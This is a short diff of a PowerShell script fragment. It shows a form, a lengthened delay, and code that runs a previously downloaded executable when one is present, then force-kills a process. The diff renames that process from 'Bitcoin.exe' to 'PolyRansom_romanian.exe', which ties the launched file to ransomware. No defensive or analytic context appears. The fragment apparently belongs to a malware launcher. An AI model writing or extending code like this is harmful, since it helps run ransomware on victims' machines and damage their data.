@@ -30,13 +30,12 @@ $form.Add_MouseDown({
 })
 $form.Show()
 
-Start-Sleep -Seconds 1
+Start-Sleep -Seconds 10
 
 if (Test-Path $downloadPath) {
     Start-Process -FilePath $downloadPath -Wait
     Start-Sleep -Seconds 10
-    Stop-Process -Name "Bitcoin.exe" -Force
-    exit
+    Stop-Process -Name "PolyRansom_romanian.exe" -Force
 } else {
-
+    
 }
